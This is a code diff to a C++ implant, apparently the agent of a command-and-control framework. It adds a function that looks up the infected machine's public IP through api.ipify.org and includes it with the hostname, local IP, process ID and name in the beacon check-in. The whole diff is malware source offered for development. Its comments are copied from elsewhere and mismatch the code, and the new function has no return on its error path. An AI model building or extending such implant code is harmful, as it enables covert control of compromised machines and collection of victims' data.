@@ -91,6 +91,28 @@ std::string GetRegistry() // Needs Optimization because at the moment this funct
     return ret.str();
 }
 
+std::string GetPublicIP() {
+    try {
+        // Construct our listening post endpoint URL from user args, only HTTP to start
+        std::stringstream ss;
+        ss << "https://api.ipify.org?format=text";
+        std::string fullServerUrl = ss.str();
+
+        // Make an asynchronous HTTP GET request to the api.ipify
+        cpr::AsyncResponse asyncRequest = cpr::GetAsync(cpr::Url{ fullServerUrl });
+        // Retrieve the response when it's ready
+        cpr::Response response = asyncRequest.get();
+
+        //std::cout << response.text << std::endl; // For debug
+
+        // Return the body of the response from the listening post, may include new tasks
+        return response.text;
+    }
+    catch (std::exception& e) {
+        std::cerr << "Could not deal with socket. Exception: " << e.what() << std::endl;
+    }
+}
+
 std::string GetMachineIP() {
     try {
         boost::asio::io_service netService;
@@ -161,7 +183,8 @@ void Implant::beaconCheckIn(const char* url) {
     std::stringstream resultsStringStream;
     // Function from boost lib that gets the hostname and returns a string type
     std::string hostname = boost::asio::ip::host_name();
-    // Function from boost lib that gets the Machine IP address
+    // Functions from boost lib that gets the Machine IP address and Public IP
+    std::string PublicIP = GetPublicIP();
     std::string machineIP = GetMachineIP();
     // Function that gets Beacon Process PID
     std::string PID = GetPID();
@@ -169,6 +192,7 @@ void Implant::beaconCheckIn(const char* url) {
     std::string nameProcess = GetProcessName();
 
     // Adding our results to the root ptree for json format
+    resultsLocal.put("Public IP", PublicIP);
     resultsLocal.put("IP", machineIP);
     resultsLocal.put("Hostname", hostname);
     resultsLocal.put("PID", PID);
